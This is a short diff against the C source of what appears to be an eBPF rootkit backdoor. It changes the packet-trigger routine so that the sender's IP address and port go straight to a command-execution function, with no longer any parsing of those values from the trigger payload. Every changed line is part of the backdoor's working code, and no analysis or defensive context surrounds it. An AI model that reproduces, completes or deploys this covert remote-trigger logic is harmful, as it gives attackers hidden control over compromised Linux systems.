@@ -49,7 +49,7 @@ static __always_inline int execute_key_command(int command_received, __u32 ip, _
 }
 
 
-static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 payload_size){
+static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 payload_size, __u32 s_ip, __u16 s_port){
     char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
     char section3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
@@ -166,10 +166,8 @@ backdoor_finish:
 
     //If we reach this point then we received trigger packet
     bpf_printk("Finished backdoor V1 check with success\n");
-    __u32 ip;
-    __u16 port;
-    __builtin_memcpy(&ip, payload+0x01, sizeof(__u32));
-    __builtin_memcpy(&port, payload+0x05, sizeof(__u16));
+    __u32 ip = s_ip;
+    __u16 port = s_port;
 
     execute_key_command(command_received, ip, port);
 
